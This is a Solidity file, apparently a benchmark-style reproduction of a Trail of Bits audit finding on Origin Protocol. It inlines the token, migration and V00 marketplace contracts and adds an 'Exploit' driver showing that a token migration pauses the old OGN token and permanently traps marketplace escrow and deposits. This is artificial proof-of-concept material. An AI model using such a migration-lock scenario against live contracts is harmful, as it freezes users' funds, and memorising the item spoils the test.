pragma solidity ^0.4.24;

// -----------------------------------------------------------------------------
// AuditVault #17100 - Origin Protocol (Trail of Bits review)
// "OriginToken contract migration breaks Marketplace offer reference"
//
// Self-contained Playground synthetic exploit. Every token/marketplace/migration
// contract below is the REAL audited Origin source, inlined VERBATIM from the
// OriginProtocol/origin repo at commit 981e580fa3ba9325e10eb0608fe6aeb4605e7a23
// (origin-contracts/contracts/, the pre-#1422 version reviewed by Trail of Bits),
// together with its OpenZeppelin-solidity 1.10.0 dependencies. Only the import
// statements / SPDX / pragma headers were stripped so everything compiles as ONE
// file, and V00_Marketplace's local `ERC20` opaque-token interface was renamed to
// `IERC20` to deconflict with OZ's `ERC20` in a single compilation unit. No
// contract logic was changed.
//
// Bug: V00_Marketplace records the OGN token ONCE in `tokenAddr`, and every ERC20
// offer stores the address it was created with in `Offer.currency`. A token
// migration mints replacement balances in a NEW OriginToken and PAUSES the old
// one; the Marketplace has no migration hook, so `tokenAddr` / `Offer.currency`
// still point at the paused old token. finalize() -> paySeller() then calls the
// paused token's transfer() and reverts, and withdrawListing() reverts the same
// way, so BOTH the listing deposit and the offer escrow are permanently trapped.
// -----------------------------------------------------------------------------

// ============================================================================
// OpenZeppelin-solidity 1.10.0  math/SafeMath.sol
// ============================================================================
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return a / b;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

// ============================================================================
// OpenZeppelin-solidity 1.10.0  ownership/Ownable.sol
// ============================================================================
contract Ownable {
  address public owner;

  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    _transferOwnership(_newOwner);
  }

  function _transferOwnership(address _newOwner) internal {
    require(_newOwner != address(0));
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
}

// ============================================================================
// OpenZeppelin-solidity 1.10.0  lifecycle/Pausable.sol
// ============================================================================
contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;

  modifier whenNotPaused() {
    require(!paused);
    _;
  }

  modifier whenPaused() {
    require(paused);
    _;
  }

  function pause() onlyOwner whenNotPaused public {
    paused = true;
    emit Pause();
  }

  function unpause() onlyOwner whenPaused public {
    paused = false;
    emit Unpause();
  }
}

// ============================================================================
// OpenZeppelin-solidity 1.10.0  token/ERC20/ERC20Basic.sol
// ============================================================================
contract ERC20Basic {
  function totalSupply() public view returns (uint256);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

// ============================================================================
// OpenZeppelin-solidity 1.10.0  token/ERC20/ERC20.sol
// ============================================================================
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender)
    public view returns (uint256);

  function transferFrom(address from, address to, uint256 value)
    public returns (bool);

  function approve(address spender, uint256 value) public returns (bool);
  event Approval(
    address indexed owner,
    address indexed spender,
    uint256 value
  );
}

// ============================================================================
// OpenZeppelin-solidity 1.10.0  token/ERC20/BasicToken.sol
// ============================================================================
contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  uint256 totalSupply_;

  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public view returns (uint256) {
    return balances[_owner];
  }
}

// ============================================================================
// OpenZeppelin-solidity 1.10.0  token/ERC20/StandardToken.sol
// ============================================================================
contract StandardToken is ERC20, BasicToken {

  mapping (address => mapping (address => uint256)) internal allowed;

  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    returns (bool)
  {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(
    address _owner,
    address _spender
   )
    public
    view
    returns (uint256)
  {
    return allowed[_owner][_spender];
  }

  function increaseApproval(
    address _spender,
    uint _addedValue
  )
    public
    returns (bool)
  {
    allowed[msg.sender][_spender] = (
      allowed[msg.sender][_spender].add(_addedValue));
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

  function decreaseApproval(
    address _spender,
    uint _subtractedValue
  )
    public
    returns (bool)
  {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}

// ============================================================================
// OpenZeppelin-solidity 1.10.0  token/ERC20/PausableToken.sol
// ============================================================================
contract PausableToken is StandardToken, Pausable {

  function transfer(
    address _to,
    uint256 _value
  )
    public
    whenNotPaused
    returns (bool)
  {
    return super.transfer(_to, _value);
  }

  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    whenNotPaused
    returns (bool)
  {
    return super.transferFrom(_from, _to, _value);
  }

  function approve(
    address _spender,
    uint256 _value
  )
    public
    whenNotPaused
    returns (bool)
  {
    return super.approve(_spender, _value);
  }

  function increaseApproval(
    address _spender,
    uint _addedValue
  )
    public
    whenNotPaused
    returns (bool success)
  {
    return super.increaseApproval(_spender, _addedValue);
  }

  function decreaseApproval(
    address _spender,
    uint _subtractedValue
  )
    public
    whenNotPaused
    returns (bool success)
  {
    return super.decreaseApproval(_spender, _subtractedValue);
  }
}

// ============================================================================
// OpenZeppelin-solidity 1.10.0  token/ERC20/BurnableToken.sol
// ============================================================================
contract BurnableToken is BasicToken {

  event Burn(address indexed burner, uint256 value);

  function burn(uint256 _value) public {
    _burn(msg.sender, _value);
  }

  function _burn(address _who, uint256 _value) internal {
    require(_value <= balances[_who]);
    balances[_who] = balances[_who].sub(_value);
    totalSupply_ = totalSupply_.sub(_value);
    emit Burn(_who, _value);
    emit Transfer(_who, address(0), _value);
  }
}

// ============================================================================
// OpenZeppelin-solidity 1.10.0  token/ERC20/MintableToken.sol
// ============================================================================
contract MintableToken is StandardToken, Ownable {
  event Mint(address indexed to, uint256 amount);
  event MintFinished();

  bool public mintingFinished = false;

  modifier canMint() {
    require(!mintingFinished);
    _;
  }

  modifier hasMintPermission() {
    require(msg.sender == owner);
    _;
  }

  function mint(
    address _to,
    uint256 _amount
  )
    hasMintPermission
    canMint
    public
    returns (bool)
  {
    totalSupply_ = totalSupply_.add(_amount);
    balances[_to] = balances[_to].add(_amount);
    emit Mint(_to, _amount);
    emit Transfer(address(0), _to, _amount);
    return true;
  }

  function finishMinting() onlyOwner canMint public returns (bool) {
    mintingFinished = true;
    emit MintFinished();
    return true;
  }
}

// ============================================================================
// OpenZeppelin-solidity 1.10.0  token/ERC20/DetailedERC20.sol
// ============================================================================
contract DetailedERC20 is ERC20 {
  string public name;
  string public symbol;
  uint8 public decimals;

  constructor(string _name, string _symbol, uint8 _decimals) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
  }
}

// ============================================================================
// Origin  token/WhitelistedPausableToken.sol  (real audited source)
// ============================================================================
contract WhitelistedPausableToken is PausableToken {
    uint256 public whitelistExpiration;
    mapping (address => bool) public allowedTransactors;

    event SetWhitelistExpiration(uint256 expiration);
    event AllowedTransactorAdded(address sender);
    event AllowedTransactorRemoved(address sender);

    modifier allowedTransfer(address _from, address _to) {
        require(
            !whitelistActive() ||
            allowedTransactors[_from] ||
            allowedTransactors[_to],
            "neither sender nor recipient are allowed"
        );
        _;
    }

    function whitelistActive() public view returns (bool) {
        return block.timestamp < whitelistExpiration;
    }

    function addAllowedTransactor(address _transactor) public onlyOwner {
        emit AllowedTransactorAdded(_transactor);
        allowedTransactors[_transactor] = true;
    }

    function removeAllowedTransactor(address _transactor) public onlyOwner {
        emit AllowedTransactorRemoved(_transactor);
        delete allowedTransactors[_transactor];
    }

    function setWhitelistExpiration(uint256 _expiration) public onlyOwner {
        require(
            whitelistExpiration == 0 || whitelistActive(),
            "an expired whitelist cannot be extended"
        );
        require(
            _expiration >= block.timestamp + 1 days,
            "whitelist expiration not far enough into the future"
        );
        emit SetWhitelistExpiration(_expiration);
        whitelistExpiration = _expiration;
    }

    function transfer(
        address _to,
        uint256 _value
    )
        public
        allowedTransfer(msg.sender, _to)
        returns (bool)
    {
        return super.transfer(_to, _value);
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    )
    public
        allowedTransfer(_from, _to)
    returns (bool)
    {
        return super.transferFrom(_from, _to, _value);
    }
}

// ============================================================================
// Origin  token/OriginToken.sol  (real audited source)
// ============================================================================
contract OriginToken is BurnableToken, MintableToken, WhitelistedPausableToken, DetailedERC20 {
    event AddCallSpenderWhitelist(address enabler, address spender);
    event RemoveCallSpenderWhitelist(address disabler, address spender);

    mapping (address => bool) public callSpenderWhitelist;

    constructor(uint256 _initialSupply) DetailedERC20("OriginToken", "OGN", 18) public {
        owner = msg.sender;
        mint(owner, _initialSupply);
    }

    function burn(uint256 _value) public onlyOwner {
        super.burn(_value);
    }

    function burn(address _who, uint256 _value) public onlyOwner {
        _burn(_who, _value);
    }

    function addCallSpenderWhitelist(address _spender) public onlyOwner {
        callSpenderWhitelist[_spender] = true;
        emit AddCallSpenderWhitelist(msg.sender, _spender);
    }

    function removeCallSpenderWhitelist(address _spender) public onlyOwner {
        delete callSpenderWhitelist[_spender];
        emit RemoveCallSpenderWhitelist(msg.sender, _spender);
    }

    function approveAndCallWithSender(
        address _spender,
        uint256 _value,
        bytes4 _selector,
        bytes _callParams
    )
        public
        payable
        returns (bool)
    {
        require(_spender != address(this), "token contract can't be approved");
        require(callSpenderWhitelist[_spender], "spender not in whitelist");

        require(super.approve(_spender, _value), "approve failed");

        bytes memory callData = abi.encodePacked(_selector, uint256(msg.sender), _callParams);
        require(_spender.call.value(msg.value)(callData), "proxied call failed");
        return true;
    }
}

// ============================================================================
// Origin  token/TokenMigration.sol  (real audited source, pre-#1422)
// ============================================================================
contract TokenMigration is Ownable {
    OriginToken public fromToken;
    OriginToken public toToken;
    mapping (address => bool) public migrated;
    bool public finished;

    event Migrated(address indexed account, uint256 balance);
    event MigrationFinished();

    modifier notFinished() {
        require(!finished, "migration already finished");
        _;
    }

    constructor(OriginToken _fromToken, OriginToken _toToken) public {
        owner = msg.sender;
        fromToken = _fromToken;
        toToken = _toToken;
    }

    function migrateAccounts(address[] _holders) public onlyOwner notFinished {
        for (uint i = 0; i < _holders.length; i++) {
            migrateAccount(_holders[i]);
        }
    }

    function migrateAccount(address _holder) public onlyOwner notFinished {
        require(!migrated[_holder], "holder already migrated");
        uint256 balance = fromToken.balanceOf(_holder);
        if (balance > 0) {
            toToken.mint(_holder, balance);
            migrated[_holder] = true;
            emit Migrated(_holder, balance);
        }
    }

    function finish(address _newTokenOwner) public onlyOwner notFinished {
        require(
            fromToken.totalSupply() == toToken.totalSupply(),
            "total token supplies do not match"
        );
        require(
            _newTokenOwner != address(this),
            "this contract cannot own the token contract"
        );
        finished = true;
        toToken.transferOwnership(_newTokenOwner);
        emit MigrationFinished();
    }
}

// ============================================================================
// Origin  marketplace/v00/Marketplace.sol  (real audited source)
// The contract's local opaque-token interface `ERC20` is renamed to `IERC20`
// ONLY to deconflict with OZ's `ERC20` in this single compilation unit. Logic
// is unchanged.
// ============================================================================
contract IERC20 {
    function transfer(address _to, uint256 _value) external returns (bool);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
}


contract V00_Marketplace is Ownable {

    event MarketplaceData  (address indexed party, bytes32 ipfsHash);
    event AffiliateAdded   (address indexed party, bytes32 ipfsHash);
    event AffiliateRemoved (address indexed party, bytes32 ipfsHash);
    event ListingCreated   (address indexed party, uint indexed listingID, bytes32 ipfsHash);
    event ListingUpdated   (address indexed party, uint indexed listingID, bytes32 ipfsHash);
    event ListingWithdrawn (address indexed party, uint indexed listingID, bytes32 ipfsHash);
    event ListingArbitrated(address indexed party, uint indexed listingID, bytes32 ipfsHash);
    event ListingData      (address indexed party, uint indexed listingID, bytes32 ipfsHash);
    event OfferCreated     (address indexed party, uint indexed listingID, uint indexed offerID, bytes32 ipfsHash);
    event OfferAccepted    (address indexed party, uint indexed listingID, uint indexed offerID, bytes32 ipfsHash);
    event OfferFinalized   (address indexed party, uint indexed listingID, uint indexed offerID, bytes32 ipfsHash);
    event OfferWithdrawn   (address indexed party, uint indexed listingID, uint indexed offerID, bytes32 ipfsHash);
    event OfferFundsAdded  (address indexed party, uint indexed listingID, uint indexed offerID, bytes32 ipfsHash);
    event OfferDisputed    (address indexed party, uint indexed listingID, uint indexed offerID, bytes32 ipfsHash);
    event OfferRuling      (address indexed party, uint indexed listingID, uint indexed offerID, bytes32 ipfsHash, uint ruling);
    event OfferData        (address indexed party, uint indexed listingID, uint indexed offerID, bytes32 ipfsHash);

    struct Listing {
        address seller;
        uint deposit;
        address depositManager;
    }

    struct Offer {
        uint value;
        uint commission;
        uint refund;
        IERC20 currency;
        address buyer;
        address affiliate;
        address arbitrator;
        uint finalizes;
        uint8 status;
    }

    Listing[] public listings;
    mapping(uint => Offer[]) public offers;
    mapping(address => bool) public allowedAffiliates;

    IERC20 public tokenAddr;

    constructor(address _tokenAddr) public {
        owner = msg.sender;
        setTokenAddr(_tokenAddr);
        allowedAffiliates[0x0] = true;
    }

    function totalListings() public view returns (uint) {
        return listings.length;
    }

    function totalOffers(uint listingID) public view returns (uint) {
        return offers[listingID].length;
    }

    function createListing(bytes32 _ipfsHash, uint _deposit, address _depositManager)
        public
    {
        _createListing(msg.sender, _ipfsHash, _deposit, _depositManager);
    }

    function createListingWithSender(
        address _seller,
        bytes32 _ipfsHash,
        uint _deposit,
        address _depositManager
    )
        public returns (bool)
    {
        require(msg.sender == address(tokenAddr), "Token must call");
        _createListing(_seller, _ipfsHash, _deposit, _depositManager);
        return true;
    }

    function _createListing(
        address _seller,
        bytes32 _ipfsHash,
        uint _deposit,
        address _depositManager
    )
        private
    {
        require(_depositManager != 0x0, "Must specify depositManager");

        listings.push(Listing({
            seller: _seller,
            deposit: _deposit,
            depositManager: _depositManager
        }));

        if (_deposit > 0) {
            tokenAddr.transferFrom(_seller, this, _deposit);
        }
        emit ListingCreated(_seller, listings.length - 1, _ipfsHash);
    }

    function updateListing(
        uint listingID,
        bytes32 _ipfsHash,
        uint _additionalDeposit
    ) public {
        _updateListing(msg.sender, listingID, _ipfsHash, _additionalDeposit);
    }

    function updateListingWithSender(
        address _seller,
        uint listingID,
        bytes32 _ipfsHash,
        uint _additionalDeposit
    )
        public returns (bool)
    {
        require(msg.sender == address(tokenAddr), "Token must call");
        _updateListing(_seller, listingID, _ipfsHash, _additionalDeposit);
        return true;
    }

    function _updateListing(
        address _seller,
        uint listingID,
        bytes32 _ipfsHash,
        uint _additionalDeposit
    ) private {
        Listing storage listing = listings[listingID];
        require(listing.seller == _seller, "Seller must call");

        if (_additionalDeposit > 0) {
            tokenAddr.transferFrom(_seller, this, _additionalDeposit);
            listing.deposit += _additionalDeposit;
        }

        emit ListingUpdated(listing.seller, listingID, _ipfsHash);
    }

    function withdrawListing(uint listingID, address _target, bytes32 _ipfsHash) public {
        Listing storage listing = listings[listingID];
        require(msg.sender == listing.depositManager, "Must be depositManager");
        require(_target != 0x0, "No target");
        tokenAddr.transfer(_target, listing.deposit);
        emit ListingWithdrawn(_target, listingID, _ipfsHash);
    }

    function makeOffer(
        uint listingID,
        bytes32 _ipfsHash,
        uint _finalizes,
        address _affiliate,
        uint256 _commission,
        uint _value,
        IERC20 _currency,
        address _arbitrator
    )
        public
        payable
    {
        bool affiliateWhitelistDisabled = allowedAffiliates[address(this)];
        require(
            affiliateWhitelistDisabled || allowedAffiliates[_affiliate],
            "Affiliate not allowed"
        );

        if (_affiliate == 0x0) {
            require(_commission == 0, "commission requires affiliate");
        }

        offers[listingID].push(Offer({
            status: 1,
            buyer: msg.sender,
            finalizes: _finalizes,
            affiliate: _affiliate,
            commission: _commission,
            currency: _currency,
            value: _value,
            arbitrator: _arbitrator,
            refund: 0
        }));

        if (address(_currency) == 0x0) {
            require(msg.value == _value, "ETH value doesn't match offer");
        } else {
            require(msg.value == 0, "ETH would be lost");
            require(
                _currency.transferFrom(msg.sender, this, _value),
                "transferFrom failed"
            );
        }

        emit OfferCreated(msg.sender, listingID, offers[listingID].length-1, _ipfsHash);
    }

    function makeOffer(
        uint listingID,
        bytes32 _ipfsHash,
        uint _finalizes,
        address _affiliate,
        uint256 _commission,
        uint _value,
        IERC20 _currency,
        address _arbitrator,
        uint _withdrawOfferID
    )
        public
        payable
    {
        withdrawOffer(listingID, _withdrawOfferID, _ipfsHash);
        makeOffer(listingID, _ipfsHash, _finalizes, _affiliate, _commission, _value, _currency, _arbitrator);
    }

    function acceptOffer(uint listingID, uint offerID, bytes32 _ipfsHash) public {
        Listing storage listing = listings[listingID];
        Offer storage offer = offers[listingID][offerID];
        require(msg.sender == listing.seller, "Seller must accept");
        require(offer.status == 1, "status != created");
        require(
            listing.deposit >= offer.commission,
            "deposit must cover commission"
        );
        if (offer.finalizes < 1000000000) {
            offer.finalizes = now + offer.finalizes;
        }
        listing.deposit -= offer.commission;
        offer.status = 2;
        emit OfferAccepted(msg.sender, listingID, offerID, _ipfsHash);
    }

    function withdrawOffer(uint listingID, uint offerID, bytes32 _ipfsHash) public {
        Listing storage listing = listings[listingID];
        Offer storage offer = offers[listingID][offerID];
        require(
            msg.sender == offer.buyer || msg.sender == listing.seller,
            "Restricted to buyer or seller"
        );
        require(offer.status == 1, "status != created");
        refundBuyer(listingID, offerID);
        emit OfferWithdrawn(msg.sender, listingID, offerID, _ipfsHash);
        delete offers[listingID][offerID];
    }

    function addFunds(uint listingID, uint offerID, bytes32 _ipfsHash, uint _value) public payable {
        Offer storage offer = offers[listingID][offerID];
        require(msg.sender == offer.buyer, "Buyer must call");
        require(offer.status == 2, "status != accepted");
        if (address(offer.currency) == 0x0) {
            require(
                msg.value == _value,
                "sent != offered value"
            );
        } else {
            require(msg.value == 0, "ETH must not be sent");
            require(
                offer.currency.transferFrom(msg.sender, this, _value),
                "transferFrom failed"
            );
        }
        offer.value += _value;
        emit OfferFundsAdded(msg.sender, listingID, offerID, _ipfsHash);
    }

    function finalize(uint listingID, uint offerID, bytes32 _ipfsHash) public {
        Listing storage listing = listings[listingID];
        Offer storage offer = offers[listingID][offerID];
        if (now <= offer.finalizes) {
            require(
                msg.sender == offer.buyer,
                "Only buyer can finalize"
            );
        } else {
            require(
                msg.sender == offer.buyer || msg.sender == listing.seller,
                "Seller or buyer must finalize"
            );
        }
        require(offer.status == 2, "status != accepted");
        paySeller(listingID, offerID);
        if (msg.sender == offer.buyer) {
            payCommission(listingID, offerID);
        }
        emit OfferFinalized(msg.sender, listingID, offerID, _ipfsHash);
        delete offers[listingID][offerID];
    }

    function dispute(uint listingID, uint offerID, bytes32 _ipfsHash) public {
        Listing storage listing = listings[listingID];
        Offer storage offer = offers[listingID][offerID];
        require(
            msg.sender == offer.buyer || msg.sender == listing.seller,
            "Must be seller or buyer"
        );
        require(offer.status == 2, "status != accepted");
        require(now <= offer.finalizes, "Already finalized");
        offer.status = 3;
        emit OfferDisputed(msg.sender, listingID, offerID, _ipfsHash);
    }

    function executeRuling(
        uint listingID,
        uint offerID,
        bytes32 _ipfsHash,
        uint _ruling,
        uint _refund
    ) public {
        Offer storage offer = offers[listingID][offerID];
        require(msg.sender == offer.arbitrator, "Must be arbitrator");
        require(offer.status == 3, "status != disputed");
        require(_refund <= offer.value, "refund too high");
        offer.refund = _refund;
        if (_ruling & 1 == 1) {
            refundBuyer(listingID, offerID);
        } else  {
            paySeller(listingID, offerID);
        }
        if (_ruling & 2 == 2) {
            payCommission(listingID, offerID);
        } else  {
            listings[listingID].deposit += offer.commission;
        }
        emit OfferRuling(offer.arbitrator, listingID, offerID, _ipfsHash, _ruling);
        delete offers[listingID][offerID];
    }

    function updateRefund(uint listingID, uint offerID, uint _refund, bytes32 _ipfsHash) public {
        Offer storage offer = offers[listingID][offerID];
        Listing storage listing = listings[listingID];
        require(msg.sender == listing.seller, "Seller must call");
        require(offer.status == 2, "status != accepted");
        require(_refund <= offer.value, "Excessive refund");
        offer.refund = _refund;
        emit OfferData(msg.sender, listingID, offerID, _ipfsHash);
    }

    function refundBuyer(uint listingID, uint offerID) private {
        Offer storage offer = offers[listingID][offerID];
        if (address(offer.currency) == 0x0) {
            require(offer.buyer.send(offer.value), "ETH refund failed");
        } else {
            require(
                offer.currency.transfer(offer.buyer, offer.value),
                "Refund failed"
            );
        }
    }

    function paySeller(uint listingID, uint offerID) private {
        Listing storage listing = listings[listingID];
        Offer storage offer = offers[listingID][offerID];
        uint value = offer.value - offer.refund;

        if (address(offer.currency) == 0x0) {
            require(offer.buyer.send(offer.refund), "ETH refund failed");
            require(listing.seller.send(value), "ETH send failed");
        } else {
            require(
                offer.currency.transfer(offer.buyer, offer.refund),
                "Refund failed"
            );
            require(
                offer.currency.transfer(listing.seller, value),
                "Transfer failed"
            );
        }
    }

    function payCommission(uint listingID, uint offerID) private {
        Offer storage offer = offers[listingID][offerID];
        if (offer.affiliate != 0x0) {
            require(
                tokenAddr.transfer(offer.affiliate, offer.commission),
                "Commission transfer failed"
            );
        }
    }

    function addData(bytes32 ipfsHash) public {
        emit MarketplaceData(msg.sender, ipfsHash);
    }

    function addData(uint listingID, bytes32 ipfsHash) public {
        emit ListingData(msg.sender, listingID, ipfsHash);
    }

    function addData(uint listingID, uint offerID, bytes32 ipfsHash) public {
        emit OfferData(msg.sender, listingID, offerID, ipfsHash);
    }

    function sendDeposit(uint listingID, address target, uint value, bytes32 ipfsHash) public {
        Listing storage listing = listings[listingID];
        require(listing.depositManager == msg.sender, "depositManager must call");
        require(listing.deposit >= value, "Value too high");
        listing.deposit -= value;
        require(tokenAddr.transfer(target, value), "Transfer failed");
        emit ListingArbitrated(target, listingID, ipfsHash);
    }

    function setTokenAddr(address _tokenAddr) public onlyOwner {
        tokenAddr = IERC20(_tokenAddr);
    }

    function addAffiliate(address _affiliate, bytes32 ipfsHash) public onlyOwner {
        allowedAffiliates[_affiliate] = true;
        emit AffiliateAdded(_affiliate, ipfsHash);
    }

    function removeAffiliate(address _affiliate, bytes32 ipfsHash) public onlyOwner {
        delete allowedAffiliates[_affiliate];
        emit AffiliateRemoved(_affiliate, ipfsHash);
    }
}

// ============================================================================
// Playground exploit driver (cheatcode-free). Deploys the REAL Origin contracts
// and reproduces the migration-breaks-marketplace escrow lock.
//   nonce1 -> oldToken     (OriginToken)     0x97b0...b623
//   nonce2 -> newToken     (OriginToken)     0x5f3a...c3c4
//   nonce3 -> marketplace  (V00_Marketplace) 0x38f3...73b2
//   nonce4 -> migration    (TokenMigration)  0x7857...f82e
// ============================================================================
contract Exploit {
    uint256 constant DEPOSIT = 10 ether;        // listing deposit (OGN)
    uint256 constant OFFERV  = 20 ether;        // offer escrow (OGN)
    uint256 constant SUPPLY  = DEPOSIT + OFFERV; // 30 OGN

    OriginToken public oldToken;
    OriginToken public newToken;
    V00_Marketplace public marketplace;
    TokenMigration public migration;

    constructor() public {
        // Real OGN token + real V00 marketplace pointing at it.
        oldToken = new OriginToken(SUPPLY);          // nonce 1
        newToken = new OriginToken(0);               // nonce 2
        marketplace = new V00_Marketplace(oldToken); // nonce 3

        // Escrow a listing deposit and an accepted ERC20 offer, both denominated
        // in the old OGN token. The marketplace now custodies all 30 OGN.
        oldToken.approve(address(marketplace), SUPPLY);
        marketplace.createListing(bytes32("listing"), DEPOSIT, address(this));
        marketplace.makeOffer(0, bytes32("offer"), 0, address(0), 0, OFFERV, IERC20(address(oldToken)), address(0));
        marketplace.acceptOffer(0, 0, bytes32("accept"));
    }

    function run() external {
        // ---- Real token migration: mint replacement OGN, pause the old token ----
        migration = new TokenMigration(oldToken, newToken); // nonce 4
        newToken.transferOwnership(address(migration));
        oldToken.pause();                                   // old OGN frozen
        migration.migrateAccount(address(marketplace));     // mint 30 new OGN to marketplace
        migration.finish(address(this));

        // The marketplace was never rewired: tokenAddr and Offer.currency still
        // point at the paused old token.
        require(oldToken.paused(), "old token not paused");
        require(address(marketplace.tokenAddr()) == address(oldToken), "token ref changed");
        require(newToken.balanceOf(address(marketplace)) == SUPPLY, "replacement not minted");

        // ---- Harm #1: finalize() reverts (offer escrow trapped) ----
        bool finalized = address(marketplace).call(
            abi.encodeWithSignature("finalize(uint256,uint256,bytes32)", uint256(0), uint256(0), bytes32("finalize"))
        );
        require(!finalized, "finalize unexpectedly succeeded on paused token");

        // ---- Harm #2: withdrawListing() reverts (listing deposit trapped) ----
        bool withdrawn = address(marketplace).call(
            abi.encodeWithSignature("withdrawListing(uint256,address,bytes32)", uint256(0), address(this), bytes32("wd"))
        );
        require(!withdrawn, "withdrawListing unexpectedly succeeded on paused token");

        // ---- Both escrows remain locked in the marketplace ----
        require(oldToken.balanceOf(address(marketplace)) == SUPPLY, "old escrow released");
        (, uint256 listingDeposit, ) = marketplace.listings(0);
        require(listingDeposit == DEPOSIT, "listing deposit lost");
    }
}
